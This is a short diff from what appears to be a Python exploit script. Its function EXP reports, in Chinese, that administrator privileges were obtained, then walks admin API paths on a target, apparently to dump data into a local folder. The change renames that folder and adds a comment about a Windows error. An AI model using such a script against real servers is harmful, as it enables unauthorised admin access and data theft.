@@ -112,7 +112,9 @@ def EXP(auth_data):
     r = s.get(url,headers=headers)
     if r.status_code == 200:
         print("[+]获取管理员权限成功!")
-        create_dir(domian)
+        create_dir(dumpinfo)
+        # 这里在windows下会报错
+        # create_dir(domian)
         for path in path_list:
             path = '/api/v1/admin' + path
             url = f"{target}{path}".replace('//api','/api')
